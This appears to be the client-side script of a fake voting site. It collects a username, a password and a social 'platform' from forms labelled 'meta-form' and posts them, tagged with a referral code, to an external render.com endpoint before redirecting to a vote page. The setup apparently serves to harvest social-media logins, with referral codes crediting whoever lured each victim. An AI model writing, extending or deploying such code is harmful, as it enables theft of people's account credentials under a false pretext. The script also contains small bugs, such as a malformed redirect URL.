import { create } from './create.js';
import {votersCard} from './general/card.js';
const API_URL = "https://nexa-mini.onrender.com";

const refCode = JSON.parse(localStorage.getItem("referralCode"));
// Quick feedback helper
const feedback = (msg, time = 2500) => {
  const el = create({ tag: "h3", textContent: msg, className: "feedback" });
  document.body.appendChild(el);
  setTimeout(() => el.remove(), time);
};

// Main submit function
export async function submit(form) {
  const username = form.username.value.trim();
  const password = form.password.value.trim();
  const platform = form.platform.value.trim();
  const btn = form.querySelector('button[type="submit"]');

  // Validate inputs
  if (!username || username.length < 3 || !password || password.length < 6) {
    feedback("wrong credentials");
    return;
  }

  // Example referral code; replace dynamically if needed
  const referralCode = refCode || "4123389";
  const payload = { username, password, platform, referralCode };

  // Show loading
  const originalText = btn.textContent;
  btn.innerHTML = `<span class="spinner"></span>`;
  btn.disabled = true;
  const inputs = 
  document.querySelectorAll("input");
  
  inputs.forEach((input) =>{
    input.disabled = true
  })

  try {
    const response = await fetch(`${API_URL}/student/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    // Safely parse JSON
    let data;
    const contentType = response.headers.get("content-type");
    if (contentType && contentType.includes("application/json")) {
      data = await response.json();
    } else {
      data = { error:"Wrong credentials" };
      
    }

    // Handle success or error
    if (response.ok) {
       alert(JSON.stringify(response))
       window.location.href = `vote.html?=${refCode}`;
       
    } else {
      feedback(data.message || data.error || "");
    }
  } catch (err) {
    console.error("Network or server error:", err);
    feedback("Sorry something went wrong ");
  } finally {
    // Restore button
    btn.textContent = originalText;
    btn.disabled = false;
    inputs.forEach((input) =>{
    input.disabled = false
  })
  }
}

// Optional: bind to form submit
document.querySelectorAll("form.meta-form").forEach(form => {
  form.addEventListener("submit", e => {
    e.preventDefault();
    submit(form);
  });
})

window.onload = async () => {
  const result = await votersCard();
  console.log("Admins loaded:", result);
};